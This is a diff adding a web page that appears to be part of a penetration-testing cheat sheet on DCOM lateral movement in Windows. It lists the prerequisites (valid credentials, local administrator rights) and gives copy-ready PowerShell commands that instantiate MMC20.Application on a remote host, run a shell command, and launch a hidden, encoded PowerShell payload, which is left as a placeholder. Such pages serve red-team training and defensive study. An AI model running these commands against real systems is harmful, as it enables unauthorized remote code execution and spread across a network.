@@ -1,0 +1,69 @@
+<section class="page active prose-page">
+  <h1>DCOM (Distributed Component Object Model)</h1>
+
+  <p class="intro">
+    DCOM is a Microsoft technology that extends COM to allow remote execution of COM objects over RPC. Attackers abuse
+    COM objects such as MMC20.Application to execute commands on remote Windows hosts without creating services or
+    copying executables, making it a common lateral movement technique.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Requirements</h2>
+    <span></span>
+  </div>
+
+  <ul class="content-list">
+    <li>Valid credentials.</li>
+    <li>Local Administrator on the target host.</li>
+    <li>DCOM enabled (default).</li>
+    <li>RPC (TCP/135 + dynamic RPC ports) accessible.</li>
+  </ul>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Create Remote DCOM Object</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">Use the name or IP address of the target.</p>
+
+  <div class="command-row">
+    <code class="copy-text">$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","FILES04"))</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Execute Command</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Execute PowerShell Payload</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-nop -w hidden -e &lt;BASE64_PAYLOAD&gt;","7")</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Resources</h2>
+    <span></span>
+  </div>
+
+  <div class="resource-links">
+    <a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques" target="_blank" rel="noreferrer">Cybereason DCOM Lateral Movement</a>
+    <a href="https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/" target="_blank" rel="noreferrer">enigma0x3 DCOM Technique</a>
+    <a href="https://attack.mitre.org/techniques/T1021/003/" target="_blank" rel="noreferrer">MITRE ATT&amp;CK T1021.003</a>
+  </div>
+</section>
